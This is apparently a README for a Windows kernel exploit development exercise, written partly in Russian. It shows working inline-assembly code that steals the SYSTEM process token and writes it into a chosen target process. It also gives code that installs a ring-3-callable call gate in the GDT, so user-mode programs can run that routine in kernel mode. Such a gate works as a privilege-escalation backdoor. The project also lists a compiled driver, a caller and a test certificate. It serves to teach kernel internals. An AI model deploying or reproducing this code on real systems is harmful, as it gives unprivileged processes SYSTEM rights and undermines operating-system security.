# GDT CallGate. Kernel exploit development

## Задача - steal token from source process to target process

+ подготовить exploit и функцию для ring-0 callgate вызова (kernel-mode)

```C++
DWORD steal_token(DWORD TARGET_PID, DWORD SOURCE_PID)
{
 char res = 0;
#if defined(DEBUG)
 DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "CallGate - TARGET_PID: %d | SOURCE_PID: %d\n", TARGET_PID, SOURCE_PID);
#endif
 // TOKEN STEALER X86 ASM
 __asm
 {
 Start:
  pushad
   mov eax, fs : [KTHREAD_OFFSET]
   mov eax, [eax + EPROCESS_OFFSET]
   mov ecx, eax                            // Copy current _EPROCESS structure
   mov ebx, [eax + TOKEN_OFFSET]           // Copy current nt!_EPROCESS.Token
   mov edx, SOURCE_PID                     // Process PID = 0x4
   SearchSystemPID :
  mov eax, [eax + FLINK_OFFSET]    // Get nt!_EPROCESS.ActiveProcessLinks.Flink
   sub eax, FLINK_OFFSET
   cmp[eax + PID_OFFSET], edx              // Get nt!_EPROCESS.UniqueProcessId
   jne SearchSystemPID
   mov edx, [eax + TOKEN_OFFSET]           // Get SYSTEM process nt!_EPROCESS.Token
   mov esi, eax
   SearchProcessPID :
  mov ecx, eax
   mov edi, [eax + PID_OFFSET]
   mov eax, [eax + FLINK_OFFSET]   //ebx - Next _EPROCESS
   sub eax, FLINK_OFFSET
   cmp eax, esi
   jz Stop
   cmp edi, [TARGET_PID]
   jz SetToken
   jmp SearchProcessPID
   SetToken :
  mov[ecx + TOKEN_OFFSET], edx
   mov[res], 1
   Stop :
   popad
 }
 return res;
}

// INPUT STACK PARAMS:
//  SOURCE_PID  [esp+12]
// TARGET_PID  [esp+8]
// CS SELECTOR  [esp+4]
// RETADDR   [esp]
__declspec(naked) ULONG_PTR call_gate_proc() {
 __asm
 {
  // prolog
  push ebp
  mov ebp, esp

  push fs     // Save the value of FS
  mov ax, 0x30   // Set FS to kernel mode value
  mov fs, ax

  mov eax, [ebp + 16]  // SOURCE_PID
  push eax
  mov eax, [ebp + 12]  // TARGET_PID
  push eax 
  call steal_token

  pop fs     // Restore the value of FS

  // epilog
  mov esp, ebp
  pop ebp
  retf 8
 }
}
```

+ сформировать callgate descriptor с прямым вызовом exploit'а с параметрами из ring-0 в ring-3 (kernel-mode)

```C++
CALL_GATE_DESCRIPTOR build_call_gate_descriptor(PVOID entryPoint) {
 ULONG address = (ULONG)entryPoint;
 CALL_GATE_DESCRIPTOR callGateDescr = { 0 };

 callGateDescr.offset_00_15 = 0x0000ffff & address;    //Offset(specifies the procedure’s entry - point within its code - segment)
 address = address >> 16;
 callGateDescr.offset_16_31 = 0x0000ffff & address;    //Offset (specifies the procedure’s entry-point within its code-segment)
 callGateDescr.selector = 0x8;         //Code-selector (specifies memory-segment containing procedure code)
 callGateDescr.argCount = 0x2;         //Parameter count (specifies how many parameter-values will be copied)        
 callGateDescr.type = 0xC;          //Gate - Type('0x4' means a 16 - bit call - gate, '0xC' means a 32 - bit call - gate)
 callGateDescr.dpl = 0x3;          //DPL = Descriptor Privilege Level (ring-0, ring-1, ring-2, ring-3) 
 callGateDescr.pFlag = 0x1;          //P = present (1 = yes, 0 = no)

 //         P|DLP|S  type  zeros  params
 //callGateDescr(flags only) =    1110   1100  0000   0001b   <=> 0xec02

 return callGateDescr;
}
```

+ сформировать селектор по индексу callgate descriptor'а в GDT (kernel-mode)

```C++
  // create selector
  /*
   Selectors
   In real mode, the segment registers (CS, DS, ES, SS, FS, GS) specify a real mode segment. And you can put anything to them, no matter where it points. And you can read and write and execute from that segment. In protected mode, these registers are loaded with selectors.
   Selector
   Bit 0 - 1 : RPL
   Requested Protection Level. It must be equal or less privileged than the segments DPL.
   Bit 2 : TI
   If this bit is set to 1, the selector selects an entry from the LDT instead of the GDT (see below for LDT).
   Bits 3 - 15:
   Zero based index to the table (GDT or LDT).
  */
  selector = gdt_index << 3;
  selector |= 3;   // set TI = 0, RPL to 3 => allow access to this selector from ring-3
```

+ сделать вызов callgate selector'а из ring-3 (user-mode)

+ проверить смену token'а

## caller

+ содержит код программы вызова callgate selector'а из ring-3 (user-mode)

## callgate_driver

+ содержит код KMDF драйвера для работы в ring-0 (kernel-mode)

## bin

+ Caller.exe - compiled caller
+ CallGate.sys - compiled driver
+ CallGate.cer - test driver's sing public key

## Для проверки корректной работы использовались

+ ```Windows 7 SP1 x86 6.1.7601.24545```
+ ```Dbgview```
+ ```procexp```
+ ```OSR driver loader```

## Пример работы

![alt text](/img/callgate.gif)

## Ссылки

+ <https://rayanfam.com/topics/call-gates-ring-transitioning-in-ia-32-mode/>
+ <https://www.codeproject.com/Articles/45788/The-Real-Protected-Long-mode-assembly-tutorial-for>
+ <https://github.com/SinaKarvandi/IA32-CALL-GATES/tree/master>
+ <https://github.com/therealdreg/cgaty>
